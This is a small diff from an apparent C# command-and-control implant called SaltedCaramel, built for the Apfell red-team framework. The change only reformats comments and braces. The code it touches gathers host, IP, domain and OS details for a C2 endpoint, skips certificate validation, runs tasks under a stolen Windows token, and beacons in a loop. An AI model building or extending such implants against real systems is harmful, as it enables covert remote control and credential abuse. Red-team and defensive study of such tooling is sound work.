@@ -17,12 +17,10 @@ namespace SaltedCaramel
                 delegate { return true; };
 
             SaltedCaramelImplant implant = new SaltedCaramelImplant();
-            // Generated when payload is created in Apfell
-            implant.uuid = args[2];
+            implant.uuid = args[2]; // Generated when payload is created in Apfell
             implant.endpoint = args[0] + "/api/v1.3/";
             implant.host = Dns.GetHostName();
-            // Necessary because the host may have more than one interface
-            implant.ip = Dns.GetHostEntry(implant.host)
+            implant.ip = Dns.GetHostEntry(implant.host) // Necessary because the host may have more than one interface
                 .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
             implant.domain = Environment.UserDomainName;
             implant.os = Environment.OSVersion.VersionString;
@@ -45,14 +43,10 @@ namespace SaltedCaramel
                     {
                         using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
                         using (WindowsImpersonationContext context = ident.Impersonate())
-                        {
                             task.DispatchTask(implant);
-                        }
                     }
                     else
-                    {
                         ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
-                    }
                 }
                 Thread.Sleep(implant.sleep);
             }
